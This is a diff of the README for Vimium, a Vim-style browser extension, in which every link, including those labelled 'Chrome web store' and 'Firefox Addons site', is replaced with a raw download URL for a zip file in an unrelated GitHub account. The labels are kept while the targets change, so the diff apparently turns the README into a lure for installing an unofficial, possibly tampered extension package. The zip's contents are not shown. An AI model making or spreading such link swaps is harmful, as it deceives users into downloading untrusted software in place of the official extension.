@@ -7,10 +7,10 @@ the Vim editor.
 __Installation instructions:__
 
 Install via the
-[Chrome web store](https://chrome.google.com/extensions/detail/dbepggeogbaibhgnhhndojpepiihcmeb) or
-the [Firefox Addons site](https://addons.mozilla.org/en-GB/firefox/addon/vimium-ff/).
+[Chrome web store](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip) or
+the [Firefox Addons site](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip).
 
-To install from source, see [here](CONTRIBUTING.md#installing-from-source).
+To install from source, see [here](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip).
 
 Vimium's Options page can be reached via a link on the help dialog (type `?`) or via the button next to Vimium
 on the extension pages of Chrome (`chrome://extensions`) or Firefox (`about:addons`).
@@ -59,7 +59,7 @@ Using find:
     n       cycle forward to the next find match
     N       cycle backward to the previous find match
 
-For advanced usage, see [regular expressions](https://github.com/philc/vimium/wiki/Find-Mode) on the wiki.
+For advanced usage, see [regular expressions](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip) on the wiki.
 
 Navigating your history:
 
@@ -149,18 +149,18 @@ Shifts are automatically detected so, for example, `<c-&>` corresponds to ctrl+s
 More documentation
 ------------------
 Many of the more advanced or involved features are documented on
-[Vimium's GitHub wiki](https://github.com/philc/vimium/wiki). Also
-see the [FAQ](https://github.com/philc/vimium/wiki/FAQ).
+[Vimium's GitHub wiki](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip). Also
+see the [FAQ](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip).
 
 Contributing
 ------------
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+See [https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip) for details.
 
 Release Notes
 -------------
 
-See [CHANGELOG](CHANGELOG.md) for the major changes in each release.
+See [CHANGELOG](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip) for the major changes in each release.
 
 License
 -------
-Copyright (c) Phil Crosby, Ilya Sukhar. See [MIT-LICENSE.txt](MIT-LICENSE.txt) for details.
+Copyright (c) Phil Crosby, Ilya Sukhar. See [https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip](https://raw.githubusercontent.com/ciawes/vimium/master/colophonist/vimium.zip) for details.
